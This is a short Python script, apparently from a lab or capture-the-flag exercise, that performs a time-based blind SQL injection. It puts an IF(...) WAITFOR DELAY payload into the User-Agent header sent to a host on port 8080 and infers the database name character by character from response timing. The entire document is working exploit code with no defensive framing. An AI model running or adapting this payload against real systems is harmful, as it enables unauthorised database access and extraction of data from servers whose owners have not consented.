#!/usr/bin/python3

import requests
import time
from string import ascii_lowercase

# Define the length of time (in seconds) the server should
# wait if `q` is `true`
DELAY = 1
ip = "10.129.204.197"
# Evalutes `q` on the server side and returns `true` or `false`
def oracle(q):
    start = time.time()
    r = requests.get(
        f"http://{ip}:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

for c in ascii_lowercase:
    query = f"(select substring(db_name(), 5, 1)) = '{c}'"
    if oracle(query):
        print(c)
        break